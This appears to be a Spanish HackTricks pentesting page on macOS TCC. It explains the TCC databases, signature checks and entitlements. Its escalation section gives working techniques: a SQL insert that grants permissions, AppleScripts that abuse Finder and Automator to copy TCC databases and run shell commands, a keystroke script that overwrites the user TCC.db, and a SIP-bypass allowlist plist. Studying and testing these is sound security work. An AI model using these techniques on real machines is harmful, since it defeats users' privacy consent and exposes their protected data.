# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver a tu **empresa anunciada en HackTricks**? o ¿quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Información Básica**

**TCC (Transparency, Consent, and Control)** es un mecanismo en macOS para **limitar y controlar el acceso de las aplicaciones a ciertas características**, generalmente desde una perspectiva de privacidad. Esto puede incluir cosas como servicios de ubicación, contactos, fotos, micrófono, cámara, accesibilidad, acceso completo al disco y mucho más.

Desde la perspectiva del usuario, ven TCC en acción **cuando una aplicación quiere acceder a una de las características protegidas por TCC**. Cuando esto sucede, se **solicita al usuario** con un diálogo preguntándole si quiere permitir el acceso o no.

También es posible **otorgar acceso a las aplicaciones** a archivos por **intenciones explícitas** de los usuarios, por ejemplo, cuando un usuario **arrastra y suelta un archivo en un programa** (obviamente el programa debería tener acceso a él).

![Un ejemplo de un aviso de TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** es manejado por el **daemon** ubicado en `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` y configurado en `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando el servicio mach `com.apple.tccd.system`).

Hay un **tccd en modo usuario** ejecutándose por cada usuario que ha iniciado sesión definido en `/System/Library/LaunchAgents/com.apple.tccd.plist` registrando los servicios mach `com.apple.tccd` y `com.apple.usernotifications.delegate.com.apple.tccd`.

Aquí puedes ver el tccd ejecutándose como sistema y como usuario:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Los permisos se **heredan de la aplicación padre** y los **permisos** se **rastrean** en base al **Bundle ID** y al **Developer ID**.

### Bases de datos TCC

Las concesiones/negaciones se almacenan en algunas bases de datos TCC:

* La base de datos del sistema en **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Esta base de datos está **protegida por SIP**, por lo que solo un bypass de SIP puede escribir en ella.
* La base de datos TCC del usuario **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferencias por usuario.
* Esta base de datos está protegida de modo que solo procesos con altos privilegios TCC como Acceso Completo al Disco pueden escribir en ella (pero no está protegida por SIP).

{% hint style="warning" %}
Las bases de datos anteriores también están **protegidas por TCC para acceso de lectura**. Por lo tanto, **no podrás leer** tu base de datos TCC de usuario regular a menos que sea desde un proceso con privilegios TCC.

Sin embargo, recuerda que un proceso con estos altos privilegios (como **FDA** o **`kTCCServiceEndpointSecurityClient`**) podrá escribir en la base de datos TCC del usuario.
{% endhint %}

* Hay una **tercera** base de datos TCC en **`/var/db/locationd/clients.plist`** para indicar clientes autorizados a **acceder a los servicios de ubicación**.
* El archivo protegido por SIP **`/Users/carlospolop/Downloads/REG.db`** (también protegido del acceso de lectura con TCC), contiene la **ubicación** de todas las **bases de datos TCC válidas**.
* El archivo protegido por SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (también protegido del acceso de lectura con TCC), contiene más permisos concedidos por TCC.
* El archivo protegido por SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (pero legible por cualquiera) es una lista de permitidos de aplicaciones que requieren una excepción de TCC.

{% hint style="success" %}
La base de datos TCC en **iOS** está en **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
La **interfaz de usuario del centro de notificaciones** puede hacer **cambios en la base de datos TCC del sistema**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Sin embargo, los usuarios pueden **eliminar o consultar reglas** con la utilidad de línea de comandos **`tccutil`**.
{% endhint %}

#### Consultar las bases de datos

{% tabs %}
{% tab title="base de datos de usuario" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="Base de datos del sistema" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Revisando ambas bases de datos puedes verificar los permisos que una aplicación ha permitido, ha prohibido o no tiene (los solicitará).
{% endhint %}

* El **`service`** es la representación en cadena del **permiso** TCC
* El **`client`** es el **ID del paquete** o **ruta al binario** con los permisos
* El **`client_type`** indica si es un Identificador de Paquete(0) o una ruta absoluta(1)

<details>

<summary>Cómo ejecutar si es una ruta absoluta</summary>

Simplemente haz **`launctl load you_bin.plist`**, con un plist como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
<details>

* El **`auth_value`** puede tener diferentes valores: denegado(0), desconocido(1), permitido(2) o limitado(3).
* El **`auth_reason`** puede tomar los siguientes valores: Error(1), Consentimiento del Usuario(2), Establecido por el Usuario(3), Establecido por el Sistema(4), Política del Servicio(5), Política MDM(6), Política de Excepción(7), Falta la cadena de uso(8), Tiempo de espera de la solicitud(9), Preverificación Desconocida(10), Autorizado(11), Política del Tipo de Aplicación(12)
* El campo **csreq** está ahí para indicar cómo verificar el binario a ejecutar y otorgar los permisos TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Para obtener más información sobre **los otros campos** de la tabla, [**consulta esta entrada de blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

También puedes verificar **los permisos ya otorgados** a las aplicaciones en `Preferencias del Sistema --> Seguridad y Privacidad --> Privacidad --> Archivos y Carpetas`.

{% hint style="success" %}
Los usuarios _pueden_ **eliminar o consultar reglas** usando **`tccutil`**.&#x20;
{% endhint %}

#### Restablecer permisos de TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Verificaciones de Firma de TCC

La **base de datos** TCC almacena el **Bundle ID** de la aplicación, pero también **guarda** **información** sobre la **firma** para **asegurarse** de que la App que solicita usar un permiso es la correcta.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Por lo tanto, otras aplicaciones que usen el mismo nombre y ID de paquete no podrán acceder a los permisos otorgados a otras aplicaciones.
{% endhint %}

### Entitlements y Permisos TCC

Las aplicaciones **no solo necesitan** **solicitar** y haber **obtenido acceso** a algunos recursos, también necesitan **tener los entitlements relevantes**.\
Por ejemplo, **Telegram** tiene el entitlement `com.apple.security.device.camera` para solicitar **acceso a la cámara**. Una **aplicación** que **no** tenga este **entitlement no podrá** acceder a la cámara (y ni siquiera se le pedirá permiso al usuario).

Sin embargo, para que las aplicaciones **accedan** a **ciertas carpetas de usuario**, como `~/Desktop`, `~/Downloads` y `~/Documents`, **no necesitan** tener ningún **entitlement específico**. El sistema manejará el acceso de manera transparente y **solicitará al usuario** según sea necesario.

Las aplicaciones de Apple **no generarán avisos**. Contienen **derechos preconcedidos** en su lista de **entitlements**, lo que significa que **nunca generarán una ventana emergente**, **ni** aparecerán en ninguna de las **bases de datos TCC**. Por ejemplo:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Esto evitará que Calendar solicite al usuario acceso a recordatorios, calendario y la libreta de direcciones.

{% hint style="success" %}
Además de alguna documentación oficial sobre los entitlements, también es posible encontrar **información interesante no oficial sobre los entitlements en** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Algunos permisos de TCC son: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... No hay una lista pública que defina todos ellos, pero puedes consultar esta [**lista de conocidos**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Lugares sensibles no protegidos

* $HOME (en sí mismo)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### Intención del usuario / com.apple.macl

Como se mencionó anteriormente, es posible **otorgar acceso a una App a un archivo arrastrándolo y soltándolo en ella**. Este acceso no se especificará en ninguna base de datos TCC, sino como un **atributo extendido del archivo**. Este atributo **almacenará el UUID** de la app permitida:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Es curioso que el atributo **`com.apple.macl`** sea gestionado por **Sandbox**, no por tccd.

También ten en cuenta que si mueves un archivo que permite el UUID de una aplicación en tu computadora a otra computadora diferente, debido a que la misma aplicación tendrá diferentes UIDs, no concederá acceso a esa aplicación.
{% endhint %}

El atributo extendido `com.apple.macl` **no puede ser borrado** como otros atributos extendidos porque está **protegido por SIP**. Sin embargo, como [**se explica en esta publicación**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), es posible desactivarlo **comprimiendo** el archivo, **eliminándolo** y **descomprimiéndolo**.

## Escalación de Privilegios y Evasiones de TCC

### Insertar en TCC

Si en algún momento logras obtener acceso de escritura sobre una base de datos TCC, puedes usar algo como lo siguiente para añadir una entrada (elimina los comentarios):

<details>

<summary>Ejemplo de inserción en TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### Automatización para FDA\*

El nombre de TCC para el permiso de Automatización es: **`kTCCServiceAppleEvents`**\
Este permiso específico de TCC también indica la **aplicación que puede ser gestionada** dentro de la base de datos de TCC (así que los permisos no permiten gestionar todo).

**Finder** es una aplicación que **siempre tiene FDA** (incluso si no aparece en la UI), así que si tienes privilegios de **Automatización** sobre ella, puedes abusar de sus privilegios para **hacer que realice algunas acciones**.\
En este caso, tu aplicación necesitaría el permiso **`kTCCServiceAppleEvents`** sobre **`com.apple.Finder`**.

{% tabs %}
{% tab title="Robar TCC.db de usuarios" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}

{% tab title="Robar sistemas TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

Podrías abusar de esto para **escribir tu propia base de datos TCC de usuario**.

{% hint style="warning" %}
Con este permiso podrás **pedirle a Finder que acceda a carpetas restringidas por TCC** y te entregue los archivos, pero hasta donde sé, **no podrás hacer que Finder ejecute código arbitrario** para abusar completamente de su acceso FDA.

Por lo tanto, no podrás abusar de las capacidades completas de FDA.
{% endhint %}

Este es el aviso de TCC para obtener privilegios de Automatización sobre Finder:

<figure><img src="../../../../.gitbook/assets/image (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Ten en cuenta que debido a que la aplicación **Automator** tiene el permiso TCC **`kTCCServiceAppleEvents`**, puede **controlar cualquier aplicación**, como Finder. Así que teniendo el permiso para controlar Automator también podrías controlar el **Finder** con un código como el siguiente:
{% endhint %}

<details>

<summary>Obtener una shell dentro de Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Lo mismo ocurre con la **aplicación Script Editor,** puede controlar Finder, pero utilizando un AppleScript no puedes forzarlo a ejecutar un script.

### Automatización + Accesibilidad (**`kTCCServicePostEvent`)** para FDA\*

La automatización en **`System Events`** + Accesibilidad (**`kTCCServicePostEvent`**) permite enviar **pulsaciones de teclas a procesos**. De esta manera, podrías abusar de Finder para cambiar el TCC.db de los usuarios o para dar FDA a una aplicación arbitraria (aunque podría solicitarse contraseña para esto).

Ejemplo de sobrescritura del TCC.db de usuarios por Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### **Cliente de Seguridad de Endpoint a FDA**

Si tienes **`kTCCServiceEndpointSecurityClient`**, tienes FDA. Fin.

### Política del Sistema SysAdmin File a FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permite **cambiar** el atributo **`NFSHomeDirectory`** de un usuario que cambia su carpeta de inicio y, por lo tanto, permite **evitar TCC**.

### Base de Datos TCC del Usuario a FDA

Obtener **permisos de escritura** sobre la base de datos **TCC del usuario** no te permite otorgarte permisos de **`FDA`**, solo la que reside en la base de datos del sistema puede otorgar eso.

Pero puedes **darte** **`derechos de Automatización a Finder`**, y abusar de la técnica anterior para escalar a FDA\*.

### **FDA a permisos TCC**

**Acceso Completo al Disco** en nombre de TCC es **`kTCCServiceSystemPolicyAllFiles`**

No creo que esto sea un verdadero privesc, pero por si acaso lo encuentras útil: Si controlas un programa con FDA puedes **modificar la base de datos TCC del usuario y darte cualquier acceso**. Esto puede ser útil como técnica de persistencia en caso de que puedas perder tus permisos de FDA.

### **Bypass de SIP a Bypass de TCC**

La base de datos **TCC del sistema** está protegida por **SIP**, por eso solo los procesos con los **entitlements indicados van a poder modificarla**. Por lo tanto, si un atacante encuentra un **bypass de SIP** sobre un **archivo** (poder modificar un archivo restringido por SIP), podrá:

* **Eliminar la protección** de una base de datos TCC, y darse todos los permisos de TCC. Podría abusar de cualquiera de estos archivos, por ejemplo:
* La base de datos del sistema TCC
* REG.db
* MDMOverrides.plist

Sin embargo, hay otra opción para abusar de este **bypass de SIP para evitar TCC**, el archivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` es una lista de permitidos de aplicaciones que requieren una excepción de TCC. Por lo tanto, si un atacante puede **eliminar la protección SIP** de este archivo y agregar su **propia aplicación**, la aplicación podrá evitar TCC.\
Por ejemplo, para agregar terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Omisiones de TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Referencias

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver a tu **empresa anunciada en HackTricks**? o ¿quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
